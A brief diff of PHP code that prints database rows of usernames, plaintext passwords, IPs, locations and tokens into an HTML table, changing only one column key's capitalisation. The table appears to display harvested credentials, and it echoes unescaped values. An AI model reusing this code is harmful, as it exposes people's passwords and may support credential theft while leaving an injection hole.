@@ -271,7 +271,7 @@ $result = $conn->query($sql);
     // output data of each row
     while($row = $result->fetch_assoc()) {
 //$pw = $row["pass"];
-echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["token"]."</td></tr>";
+echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["Token"]."</td></tr>";
     }
 
 printf($conn->error);
